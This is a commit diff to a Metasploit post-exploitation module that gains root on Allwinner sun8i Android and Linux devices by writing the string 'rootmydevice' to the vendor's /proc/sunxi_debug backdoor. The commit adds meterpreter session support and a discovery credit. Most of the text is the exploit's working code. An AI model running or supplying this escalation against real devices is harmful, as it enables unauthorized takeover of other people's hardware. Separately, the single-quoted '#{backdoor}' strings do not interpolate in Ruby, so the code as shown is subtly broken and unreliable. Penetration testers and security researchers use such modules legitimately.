314d73546cdb339e7a3c6a231b3b386e6487918d
h00die <mike@shorebreaksecurity.com>
2016-05-13 23:12:44 -0400

    additional details, not working on tablet via malicious apk meterpreter

--- modules/post/multi/escalate/allwinner_backdoor.rb
+++ modules/post/multi/escalate/allwinner_backdoor.rb
@@ -4,12 +4,12 @@
 ##
 
 require 'msf/core'
+require 'rex'
 
 class MetasploitModule < Msf::Post
 
   include Msf::Post::File
   include Msf::Post::Linux::Priv
-  include Msf::Post::Linux::System
 
   def initialize(info={})
     super( update_info( info,
@@ -20,38 +20,39 @@ class MetasploitModule < Msf::Post
         'License'        => MSF_LICENSE,
         'Author'         =>
           [
-            'h00die <mike@stcyrsecurity.com>'            # Module
+            'h00die <mike@stcyrsecurity.com>',  # Module
+            'KotCzarny'                         # Discovery
           ],
-        'Platform'       => %w{ android linux },
+        'Platform'       => [ 'android', 'linux' ],
         'DisclosureDate' => 'Apr 30 2016',
-        'Arch'           => [ARCH_ARMLE, ARCH_DALVIK],
         'References'     =>
           [
             [ 'URL', 'http://forum.armbian.com/index.php/topic/1108-security-alert-for-allwinner-sun8i-h3a83th8/'],
-            [ 'URL', 'https://webcache.googleusercontent.com/search?q=cache:l2QYVUcDflkJ:https://github.com/allwinner-zh/linux-3.4-sunxi/blob/master/arch/arm/mach-sunxi/sunxi-debug.c+&cd=3&hl=en&ct=clnk&gl=us']
+            [ 'URL', 'https://webcache.googleusercontent.com/search?q=cache:l2QYVUcDflkJ:https://github.com/allwinner-zh/linux-3.4-sunxi/blob/master/arch/arm/mach-sunxi/sunxi-debug.c+&cd=3&hl=en&ct=clnk&gl=us'],
+            [ 'URL', 'http://irclog.whitequark.org/linux-sunxi/2016-04-29#16314390']
           ],
-        'SessionTypes'   => [ 'shell' ]
+        'SessionTypes'   => [ 'shell', 'meterpreter' ]
       ))
 
   end
 
   def run
-    backdoor = "/proc/sunxi_debug/sunxi_debug"
+    backdoor = '/proc/sunxi_debug/sunxi_debug'
     if file_exist?(backdoor)
-      vprint_good "Backdoor found, exploiting."
+      vprint_good 'Backdoor found, exploiting.'
       cmd_exec('echo "rootmydevice" > #{backdoor}')
       if is_root?
-        print_good "Privilege Escalation Successful"
+        print_good 'Privilege Escalation Successful'
         report_note(
           :host => session,
-          :type => "host.escalation",
-          :data => "Escalated to root shell via backdoor"
+          :type => 'host.escalation',
+          :data => 'Escalated to root shell via backdoor'
         )
       else
-        print_error "Privilege Escalation FAILED"
+        print_error 'Privilege Escalation FAILED'
       end
     else
-      print_error "Backdoor #{backdoor} not found."
+      print_error 'Backdoor #{backdoor} not found.'
     end
   end
 
